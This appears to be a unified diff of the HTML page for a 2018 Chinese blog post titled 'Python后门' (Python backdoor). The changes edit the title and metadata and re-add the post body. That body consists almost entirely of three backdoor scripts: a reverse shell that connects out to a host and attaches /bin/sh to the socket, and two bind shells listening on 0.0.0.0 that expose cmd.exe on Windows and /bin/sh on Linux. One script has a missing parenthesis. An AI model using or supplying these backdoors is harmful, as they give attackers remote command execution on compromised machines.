@@ -11,7 +11,7 @@
 
     <title>
         
-        Python后门 - Daybreak&#39;s Blog
+        Daybreak&#39;s Blog
         
     </title>
 
@@ -89,7 +89,7 @@
     </div>
     
         <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Python反向链接后门"><span class="toc-text">Python反向链接后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python正向链接后门"><span class="toc-text">Python正向链接后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows正向链接CmdShell"><span class="toc-text">windows正向链接CmdShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux版-bin-sh"><span class="toc-text">linux版/bin/sh</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tags-python"><span class="toc-text">tags: python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python反向链接后门"><span class="toc-text">Python反向链接后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python正向链接后门"><span class="toc-text">Python正向链接后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows正向链接CmdShell"><span class="toc-text">windows正向链接CmdShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux版-bin-sh"><span class="toc-text">linux版/bin/sh</span></a></li></ol></li></ol>
 </div>
     
 </div>
@@ -119,17 +119,11 @@
 
 <div class="post-container">
     <div class="post-title">
-        Python后门
+        
     </div>
 
     <div class="post-meta">
-        <span class="attr">发布于：<span>2018-09-20 09:45:02</span></span>
-        
-        <span class="attr">标签：/
-        
-        <a class="tag" href="/tags/#python" title="python">python</a>
-        <span>/</span>
-        
+        <span class="attr">发布于：<span>2018-09-20 20:36:40</span></span>
         
         </span>
         <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
@@ -137,7 +131,9 @@
 </span>
     </div>
     <div class="post-content ">
-        <h2 id="Python反向链接后门"><a href="#Python反向链接后门" class="headerlink" title="Python反向链接后门"></a>Python反向链接后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import socket, subprocess, os</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM</span><br><span class="line">s.connect((host,port))</span><br><span class="line">os.dup2(s.fileno(),0) # 0代表系统的stdin</span><br><span class="line">os.dup2(s.fileno(),1) # 1代表系统的stdout</span><br><span class="line">os.dup2(s.fileno(),2) # 2代表系统的stderr</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure>
+        <hr>
+<p>title: Python 后门脚本<br>date: 2018-09-20 20:36:40</p>
+<h2 id="tags-python"><a href="#tags-python" class="headerlink" title="tags: python"></a>tags: python</h2><h2 id="Python反向链接后门"><a href="#Python反向链接后门" class="headerlink" title="Python反向链接后门"></a>Python反向链接后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import socket, subprocess, os</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM</span><br><span class="line">s.connect((host,port))</span><br><span class="line">os.dup2(s.fileno(),0) # 0代表系统的stdin</span><br><span class="line">os.dup2(s.fileno(),1) # 1代表系统的stdout</span><br><span class="line">os.dup2(s.fileno(),2) # 2代表系统的stderr</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure>
 <h2 id="Python正向链接后门"><a href="#Python正向链接后门" class="headerlink" title="Python正向链接后门"></a>Python正向链接后门</h2><h3 id="windows正向链接CmdShell"><a href="#windows正向链接CmdShell" class="headerlink" title="windows正向链接CmdShell"></a>windows正向链接CmdShell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading</span><br><span class="line"></span><br><span class="line">def send(talk, proc):</span><br><span class="line">        import time</span><br><span class="line">        while True:</span><br><span class="line">                msg = proc.stdout.readline()</span><br><span class="line">                talk.send(msg)</span><br><span class="line">                </span><br><span class="line">server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">server.bind((&apos;0.0.0.0&apos;,port))</span><br><span class="line">server.listen(5)</span><br><span class="line">talk, addr = server.accept()</span><br><span class="line">print(&quot;connecting &quot;, addr)</span><br><span class="line">proc = subprocess.Popen(&apos;cmd.exe /K&apos;, stdin=subprocess.PIPE,</span><br><span class="line">                stdout=subprocess.PIPE, stderr=subprocess.PIPE,</span><br><span class="line">                shell=True)</span><br><span class="line">t = threading.Thread(target = send, args = (talk, proc))</span><br><span class="line">t.setDaemon(True)</span><br><span class="line">t.start()</span><br><span class="line">while True:</span><br><span class="line">    cmd=talk.recv(1024)</span><br><span class="line">    proc.stdin.write(cmd)</span><br><span class="line">    proc.stdin.flush()</span><br><span class="line">server.close()</span><br></pre></td></tr></table></figure>
 <h3 id="linux版-bin-sh"><a href="#linux版-bin-sh" class="headerlink" title="linux版/bin/sh"></a>linux版/bin/sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys</span><br><span class="line"></span><br><span class="line">server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">server.bind((&apos;0.0.0.0&apos;,port))</span><br><span class="line">server.listen(5)</span><br><span class="line">talk, addr = server.accept()</span><br><span class="line">print(&quot;connecting &quot;, addr)</span><br><span class="line">proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</span><br><span class="line">                        stdout=talk, stderr=talk, shell=True)</span><br></pre></td></tr></table></figure>
 
